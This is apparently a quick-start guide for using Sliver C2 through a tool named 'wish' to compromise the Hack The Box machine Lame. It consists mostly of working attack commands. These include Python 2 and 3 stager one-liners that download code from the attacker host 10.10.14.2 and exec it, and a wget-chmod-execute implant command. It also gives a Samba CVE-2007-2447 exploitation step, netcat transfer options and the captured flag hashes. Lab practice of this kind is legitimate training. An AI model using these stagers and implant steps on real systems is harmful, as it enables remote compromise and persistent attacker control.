# HTB Lame + Sliver C2 Quick Start

**Understand Sliver Stager Usage in 5 Minutes**

## Prerequisites
- wish and Sliver C2 are running
- Connected to HTB VPN (attacker IP: 10.10.14.2)

## Step 1: Start Stager (1 minute)

```bash
$ wish
> /sliver stager start --host 10.10.14.2
```

**Output:**
```
🎯 Stager listener started: stg-abc123
📡 URL: http://10.10.14.2:54321

Default Stagers:

Python 2 (HTB Lame, old Linux environments):
╭─────────────────────────────────────────────────────────────────────╮
│ python -c "import urllib2,platform;o=platform.system().lower();     │
│ a='64' if '64' in platform.machine() else '32';exec(urllib2.urlopen │
│ ('http://10.10.14.2:54321/s?o='+o+'&a='+a).read())"               │
╰─────────────────────────────────────────────────────────────────────╯

Python 3 (modern environments):
╭─────────────────────────────────────────────────────────────────────╮
│ python3 -c "import urllib.request,platform;o=platform.system()      │
│ .lower();a='64' if '64' in platform.machine() else '32';            │
│ exec(urllib.request.urlopen('http://10.10.14.2:54321/s?o='+o+'&a='  │
│ +a).read())"                                                         │
╰─────────────────────────────────────────────────────────────────────╯
```

Copy the appropriate Python one-liner based on your environment. For HTB Lame, use the Python 2 version.

## Step 2: Deploy Stager to HTB Lame (3 minutes)

```bash
# Use Samba vulnerability (CVE-2007-2447)
> exploit samba on 10.10.10.3

# Or manually inject command
> execute on 10.10.10.3: <Python one-liner copied above>
```

### Troubleshooting

#### If Fallback Script is Returned

If a fallback script (~500 bytes) is returned instead of an actual Sliver implant:
- Check connection to Sliver C2 server: `/sliver status`
- Verify implant generation permissions
- Check logs for error messages

#### If Stager Doesn't Work

In older environments like HTB Lame, the stager may hang. Try these alternatives:

1. **Minimal stager (no OS detection, Python 2)**
   ```bash
   python -c "import urllib2;exec(urllib2.urlopen('http://10.10.14.2:54321/s?o=linux&a=32').read())"
   ```

2. **Debug version (detailed error information)**
   ```bash
   /sliver stager create stg-abc123 --type debug
   ```

3. **Manual download and execute**
   ```bash
   wget http://10.10.14.2:54321/implant/stager_linux_386 -O /tmp/s && chmod +x /tmp/s && /tmp/s
   ```

#### ⚠️ HTB Lame Download Issues

In HTB Lame's older network environment, 14-16MB implant downloads may stall at 28KB.

**Recommended Workarounds:**

1. **Monitor download status**
   ```bash
   # In another terminal
   > /sliver stager status
   ```

2. **Test with small files**
   ```bash
   # Download a small file on HTB Lame to check network
   wget http://10.10.14.2:54321/s -O /tmp/test
   ```

3. **Alternative methods**
   - Transfer via SCP (if SSH access available)
   - Transfer using netcat
   - Transfer as Base64-encoded text file

## Step 3: Execute Commands (1 minute)

Once Sliver session is established:

```bash
# Check implants
> /sliver implants
┌─────────┬────────────┬──────────────┬────────────┬──────┬────────┐─
│ ID      │ Name       │ Remote       │ Platform   │ User │ Status  │
├─────────┼────────────┼──────────────┼────────────┼──────┼─────────┤
│ abc-123 │ FANCY_TIGER│ 10.10.10.3   │ linux/386  │ root │ Active  │
└─────────┴────────────┴──────────────┴────────────┴──────┴─────────┘

# Get flags
> /sliver execute FANCY_TIGER cat /root/root.txt
92caac3be140ef409e45721348a4e9df

> /sliver execute FANCY_TIGER cat /home/makis/user.txt  
69454a937d94f5f0225ea00acd2e84c5
```

## Complete! 🎉

In just 3 steps, you've obtained root on HTB Lame using Sliver C2.

### Want to Learn More?

- Different stager types (Bash, PowerShell): `/sliver stager create <id> --type bash`
- List active listeners: `/sliver stager list`
- Stop listener: `/sliver stager stop <id>`
- [Detailed guide here](HTB-Lame-Sliver-Guide-Detailed.md)